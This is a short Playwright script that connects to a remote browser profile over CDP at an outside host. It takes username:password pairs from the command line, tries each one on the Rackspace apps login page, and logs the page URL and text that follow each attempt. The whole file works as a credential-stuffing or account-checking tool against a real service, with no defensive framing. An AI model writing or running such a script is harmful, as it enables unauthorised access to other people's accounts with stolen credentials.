import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
const CDP = 'wss://clk.mrme.tech/api/profiles/912925dd-a2fc-48db-b364-0259330952cd/cdp';
const browser = await chromium.connectOverCDP(CDP, { timeout: 30000, headers: { Authorization: 'Bearer change-me-to-a-secure-token' } });
const ctx = browser.contexts()[0];
for (const [u, p] of process.argv.slice(2).map(s => { const i = s.indexOf(':'); return [s.slice(0, i), s.slice(i + 1)]; })) {
  let page;
  try {
    page = await ctx.newPage();
    await page.goto('https://apps.rackspace.com', { waitUntil: 'domcontentloaded', timeout: 60000 });
    await page.waitForTimeout(3500);
    await page.fill('#user-input', u);
    await page.waitForTimeout(400);
    await page.fill('#pass-input', p);
    await page.waitForTimeout(400);
    await page.click('button:has-text("Log In")');
    await page.waitForTimeout(9000);
    const url = page.url();
    const body = await page.evaluate(() => document.body.innerText.replace(/\s+/g, ' ').slice(0, 160));
    console.log(`\n=== ${u} ===`);
    console.log('URL  :', url.slice(0, 110));
    console.log('BODY :', body);
  } catch (e) {
    console.log(`\n=== ${u} === ERROR:`, e.message.slice(0, 120));
  } finally {
    if (page) await page.close().catch(() => {});
  }
}
await browser.close();
